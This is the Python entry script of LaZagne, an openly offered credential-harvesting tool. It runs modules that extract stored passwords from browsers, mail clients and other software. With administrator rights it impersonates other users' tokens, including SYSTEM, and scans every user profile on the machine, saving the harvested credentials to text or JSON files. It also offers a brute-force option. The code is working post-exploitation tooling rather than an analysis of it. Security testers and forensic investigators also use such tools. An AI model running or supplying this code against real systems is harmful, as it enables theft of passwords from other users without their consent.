#!/usr/bin/python

##############################################################################
#                                                                            #
#                           By Alessandro ZANNI                              #
#                                                                            #
##############################################################################

# Disclaimer: Do Not Use this program for illegal purposes ;)


# Softwares that passwords can be retrieved without needed to be in the user environmment
from __future__ import print_function
from lazagne.softwares.browsers.mozilla import Mozilla

# Configuration
from lazagne.config.write_output import parseJsonResultToBuffer, print_debug, StandartOutput
from lazagne.config.changePrivileges import ListSids, rev2self, impersonate_sid_long_handle
from lazagne.config.manageModules import get_categories, get_modules
from lazagne.config.constant import *
import argparse
import time, sys, os
import logging
import shutil
import json
import getpass
import traceback
import ctypes


# Useful for the pupy project
sys.setrecursionlimit(10000) # workaround to this error: RuntimeError: maximum recursion depth exceeded while calling a Python object

# object used to manage the output / write functions (cf write_output file)
constant.st = StandartOutput()

# Tab containing all passwords
stdoutRes = []

category = get_categories()
moduleNames = get_modules()

# Define a dictionary for all modules
modules = {}
for categoryName in category:
	modules[categoryName] = {}

# Add all modules to the dictionary
for module in moduleNames:
	modules[module.category][module.options['dest']] = module
modules['mails']['thunderbird'] = Mozilla(True) # For thunderbird (firefox and thunderbird use the same class)

def output():
	if args['write_normal']:
		constant.output = 'txt'
	
	if args['write_json']:
		constant.output = 'json'

	if args['write_all']:
		constant.output = 'all'

	if constant.output:
		if not os.path.exists(constant.folder_name):
			os.makedirs(constant.folder_name)
			# constant.file_name_results = 'credentials' # let the choice of the name to the user
		
		if constant.output != 'json':
			constant.st.write_header()

	# Remove all unecessary variables
	del args['write_normal']
	del args['write_json']
	del args['write_all']

def quiet_mode():
	if args['quiet']:
		constant.quiet_mode = True

def verbosity():
	# Write on the console + debug file
	if args['verbose']==0: level=logging.CRITICAL
	elif args['verbose'] == 1: level=logging.INFO
	elif args['verbose']>=2: level=logging.DEBUG
	
	FORMAT = "%(message)s"
	formatter = logging.Formatter(fmt=FORMAT)
	stream = logging.StreamHandler()
	stream.setFormatter(formatter)
	root = logging.getLogger()
	root.setLevel(level)
	# If other logging are set
	for r in root.handlers:
		r.setLevel(logging.CRITICAL)
	root.addHandler(stream)
	del args['verbose']

def launch_module(module, need_high_privileges=False, need_system_privileges=False, not_need_to_be_in_env=False, cannot_be_impersonate_using_tokens=False):
	modulesToLaunch = []
	try:
		# Launch only a specific module
		for i in args:
			if args[i] and i in module:
				modulesToLaunch.append(i)
	except:
		# if no args
		pass

	# Launch all modules
	if not modulesToLaunch:
		modulesToLaunch = module
	
	for i in modulesToLaunch:
		if not_need_to_be_in_env and module[i].need_to_be_in_env:
			continue

		if need_high_privileges ^ module[i].need_high_privileges:
			continue

		if need_system_privileges ^ module[i].need_system_privileges:
			continue

		if cannot_be_impersonate_using_tokens and module[i].cannot_be_impersonate_using_tokens:
			continue
		
		try:
			constant.st.title_info(i.capitalize()) 					# print title
			pwdFound = module[i].run(i.capitalize())				# run the module
			constant.st.print_output(i.capitalize(), pwdFound) 		# print the results
			
			# return value - not used but needed 
			yield True, i.capitalize(), pwdFound
		except:
			traceback.print_exc()
			print()
			error_message = traceback.format_exc()
			yield False, i.capitalize(), error_message

def manage_advanced_options():
	# File used for dictionary attacks
	if 'path' in args:
		constant.path = args['path']
	if 'bruteforce' in args: 
		constant.bruteforce = args['bruteforce']

	# Mozilla advanced options
	if 'manually' in args:
		constant.manually = args['manually']
	if 'specific_path' in args:
		constant.specific_path = args['specific_path']
	
	# Jitsi advanced options
	if 'master_pwd' in args:
		constant.jitsi_masterpass = args['master_pwd']
	
	# i.e advanced options
	if 'historic' in args:
		constant.ie_historic = args['historic']

	if args['drive']:
		drive = args['drive'].upper()
		# drive letter between A and Z
		if drive != constant.drive:
			if len(drive) == 1 and (ord(drive) >= 50 and ord(drive) <= 90):
				constant.drive = drive
			else:
				print_debug('ERROR', 'Drive letter should be a letter between A and Z')

# Run only one module
def runModule(category_choosed, need_high_privileges=False, need_system_privileges=False, not_need_to_be_in_env=False, cannot_be_impersonate_using_tokens=False):
	global category

	if category_choosed != 'all':
		category = [category_choosed]

	for categoryName in category:
		for r in launch_module(modules[categoryName], need_high_privileges, need_system_privileges, not_need_to_be_in_env, cannot_be_impersonate_using_tokens):
			yield r

# write output to file (json and txt files)
def write_in_file(result):
	if constant.output == 'json' or constant.output == 'all':
		try:
			# Human readable Json format
			prettyJson = json.dumps(result, sort_keys=True, indent=4, separators=(',', ': '))
			with open(constant.folder_name + os.sep + constant.file_name_results + '.json', 'a+b') as f:
				f.write(prettyJson.decode('unicode-escape').encode('UTF-8'))
			constant.st.do_print('[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.json')
		except Exception as e:
			print_debug('ERROR', 'Error writing the output file: %s' % e)

	if constant.output == 'txt' or constant.output == 'all':
		try:
			with open(constant.folder_name + os.sep + constant.file_name_results + '.txt', 'a+b') as f:
				a = parseJsonResultToBuffer(result)
				f.write(a.encode("UTF-8"))
			constant.st.write_footer()
			constant.st.do_print('[+] File written: ' + constant.folder_name + os.sep + constant.file_name_results + '.txt')
		except Exception as e:
			print_debug('ERROR', 'Error writing the output file: %s' % e)


# Get user list to retrieve  their passwords
def get_user_list_on_filesystem(impersonated_user=[]):
	
	# Check users existing on the system (get only directories)
	user_path = u'%s:\\Users' % constant.drive
	all_users = []
	if os.path.exists(user_path):
		all_users = os.listdir(user_path)
	
		# Remove default users
		for user in ['All Users', 'Default User', 'Default', 'Public', 'desktop.ini']:
			if user in all_users:
				all_users.remove(user)

		# Removing user that have already been impersonated
		for imper_user in impersonated_user:
			if imper_user in all_users:
				all_users.remove(imper_user)

	return all_users

def set_env_variables(user=getpass.getuser(), toImpersonate=False):
	constant.username = user
	if not toImpersonate:
		constant.profile['APPDATA'] 		= unicode(os.environ.get('APPDATA', u'%s:\\Users\\%s\\AppData\\Roaming\\' % (constant.drive, user)))
		constant.profile['USERPROFILE'] 	= unicode(os.environ.get('USERPROFILE', u'%s:\\Users\\%s\\' % (constant.drive, user)))
		constant.profile['HOMEDRIVE'] 		= unicode(os.environ.get('HOMEDRIVE', u'%s:' % constant.drive))
		constant.profile['HOMEPATH'] 		= unicode(os.environ.get('HOMEPATH', u'%s:\\Users\\%s' % (constant.drive, user)))
		constant.profile['ALLUSERSPROFILE'] = unicode(os.environ.get('ALLUSERSPROFILE', u'%s:\\ProgramData' % constant.drive))
		constant.profile['COMPOSER_HOME'] 	= unicode(os.environ.get('COMPOSER_HOME', u'%s:\\Users\\%s\\AppData\\Roaming\\Composer\\' % (constant.drive, user)))
		constant.profile['LOCALAPPDATA'] 	= unicode(os.environ.get('LOCALAPPDATA', u'%s:\\Users\\%s\\AppData\\Local' % (constant.drive, user)))
	else:
		constant.profile['APPDATA'] 		= u'%s:\\Users\\%s\\AppData\\Roaming\\' % (constant.drive, user)
		constant.profile['USERPROFILE'] 	= u'%s:\\Users\\%s\\' % (constant.drive, user)
		constant.profile['HOMEPATH'] 		= u'%s:\\Users\\%s' % (constant.drive, user)
		constant.profile['COMPOSER_HOME'] 	= u'%s:\\Users\\%s\\AppData\\Roaming\\Composer\\' % (constant.drive, user)
		constant.profile['LOCALAPPDATA'] 	= u'%s:\\Users\\%s\\AppData\\Local' % (constant.drive, user)

# print user when verbose mode is enabled (without verbose mode the user is printed on the write_output python file)
def print_user(user):
	if logging.getLogger().isEnabledFor(logging.INFO) == True:
		constant.st.print_user(user)

def clean_temporary_files():
	# try to remove all temporary files
	for h in constant.hives:
		try:
			os.remove(constant.hives[h])
			print_debug('DEBUG', 'Temporary file removed: %s' % constant.hives[h])
		except:
			pass

def runLaZagne(category_choosed='all', check_specific_drive=False):

	# ------ Part used for user impersonation ------ 

	current_user = getpass.getuser()
	if not current_user.endswith('$'):
		constant.finalResults = {'User': current_user}
		print_user(current_user)
		yield 'User', current_user
		
		if check_specific_drive:
			set_env_variables(toImpersonate=True)
		else:
			set_env_variables()

		for r in runModule(category_choosed):
			yield r
		stdoutRes.append(constant.finalResults)

	# Check if admin to impersonate
	if ctypes.windll.shell32.IsUserAnAdmin() != 0:
		# --------- Impersonation using tokens ---------
		
		sids = ListSids()
		impersonateUsers = {}
		impersonated_user = [current_user]
		for sid in sids:
			# Not save the current user's SIDs
			if current_user != sid[3].split('\\', 1)[1]:
				impersonateUsers.setdefault(sid[3].split('\\', 1)[1], []).append(sid[2])

		for user in impersonateUsers:
			if 'service ' in user.lower() or ' service' in user.lower():
				continue
			
			print_user(user)
			yield 'User', user

			constant.finalResults = {'User': user}
			for sid in impersonateUsers[user]:
				try:
					set_env_variables(user, toImpersonate=True)
					impersonate_sid_long_handle(sid, close=False)

					_cannot_be_impersonate_using_tokens = False
					_need_system_privileges = False
					
					if sid == "S-1-5-18":
						_need_system_privileges = True
					else:
						impersonated_user.append(user)
						_cannot_be_impersonate_using_tokens = True
					
					# Launch module wanted
					for r in runModule(category_choosed, need_system_privileges=_need_system_privileges, cannot_be_impersonate_using_tokens=_cannot_be_impersonate_using_tokens):
						yield r
					
					rev2self()
					stdoutRes.append(constant.finalResults)
					break
				except Exception as e:
					print(e)
					pass

		# --------- Impersonation browsing file system

		# Ready to check for all users remaining
		all_users = get_user_list_on_filesystem(impersonated_user)
		for user in all_users:
			set_env_variables(user, toImpersonate=True)
			print_user(user)
			
			# Fix value by default for user environnment (appdata and userprofile)
			constant.finalResults = {'User': user}
			yield 'User', user
			
			# Retrieve passwords that need high privileges
			for r in runModule(category_choosed, not_need_to_be_in_env=True):
				yield r
			
			stdoutRes.append(constant.finalResults)

if __name__ == '__main__':

	parser = argparse.ArgumentParser(description=constant.st.banner, formatter_class=argparse.RawTextHelpFormatter)
	parser.add_argument('--version', action='version', version='Version ' + str(constant.CURRENT_VERSION), help='laZagne version')

	# ------------------------------------------- Permanent options -------------------------------------------
	# Version and verbosity 
	PPoptional = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PPoptional._optionals.title = 'optional arguments'
	PPoptional.add_argument('-v', dest='verbose', action='count', default=0, help='increase verbosity level')
	PPoptional.add_argument('-quiet', dest='quiet', action='store_true', default=False, help='quiet mode: nothing is printed to the output')
	PPoptional.add_argument('-drive', dest='drive', action='store', default=False, help='drive to perform the test (default: C)')
	PPoptional.add_argument('-path', dest='path', action='store', help='path of a file used for dictionary file')
	PPoptional.add_argument('-b', dest='bruteforce', action='store', help='number of character to brute force')


	# Output 
	PWrite = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
	PWrite._optionals.title = 'Output'
	PWrite.add_argument('-oN', dest='write_normal', action='store_true', help='output file in a readable format')
	PWrite.add_argument('-oJ', dest='write_json', action='store_true', help='output file in a json format')
	PWrite.add_argument('-oA', dest='write_all', action='store_true', help='output file in all format')

	# ------------------------------------------- Add options and suboptions to all modules -------------------------------------------
	all_subparser = []
	for c in category:
		category[c]['parser'] = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
		category[c]['parser']._optionals.title = category[c]['help']
		
		# Manage options
		category[c]['subparser'] = []
		for module in modules[c].keys():
			m = modules[c][module]
			category[c]['parser'].add_argument(m.options['command'], action=m.options['action'], dest=m.options['dest'], help=m.options['help'])
			
			# Manage all suboptions by modules
			if m.suboptions and m.name != 'thunderbird':
				tmp = []
				for sub in m.suboptions:
					tmp_subparser = argparse.ArgumentParser(add_help=False, formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=constant.MAX_HELP_POSITION))
					tmp_subparser._optionals.title = sub['title']
					if 'type' in sub:
						tmp_subparser.add_argument(sub['command'], type=sub['type'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					else:
						tmp_subparser.add_argument(sub['command'], action=sub['action'], dest=sub['dest'], help=sub['help'])
					tmp.append(tmp_subparser)
					all_subparser.append(tmp_subparser)
				category[c]['subparser'] += tmp

	# ------------------------------------------- Print all -------------------------------------------
	parents = [PPoptional] + all_subparser + [PWrite]
	dic = {'all':{'parents':parents, 'help':'Run all modules', 'func': runModule}}
	for c in category:
		parser_tab = [PPoptional, category[c]['parser']]
		if 'subparser' in category[c]:
			if category[c]['subparser']:
				parser_tab += category[c]['subparser']
		parser_tab += [PWrite]
		dic_tmp = {c: {'parents': parser_tab, 'help':'Run %s module' % c, 'func': runModule}}
		dic = dict(dic.items() + dic_tmp.items())

	#2- Main commands
	subparsers = parser.add_subparsers(help='Choose a main command')
	for d in dic:
		subparsers.add_parser(d, parents=dic[d]['parents'], help=dic[d]['help']).set_defaults(func=dic[d]['func'], auditType=d)

	# ------------------------------------------- Parse arguments -------------------------------------------

	args = dict(parser.parse_args()._get_kwargs())
	arguments = parser.parse_args()
	category_choosed = args['auditType']

	check_specific_drive = False
	if args['drive']:
		check_specific_drive = True

	quiet_mode()

	# Print the title
	constant.st.first_title()

	# Define constant variables
	output()
	verbosity()
	manage_advanced_options()

	start_time = time.time()

	for r in runLaZagne(category_choosed, check_specific_drive=check_specific_drive):
		pass

	clean_temporary_files()
	write_in_file(stdoutRes)
	
	if not constant.quiet_mode:
		constant.st.print_footer()
		elapsed_time = time.time() - start_time
		print('\nelapsed time = ' + str(elapsed_time))
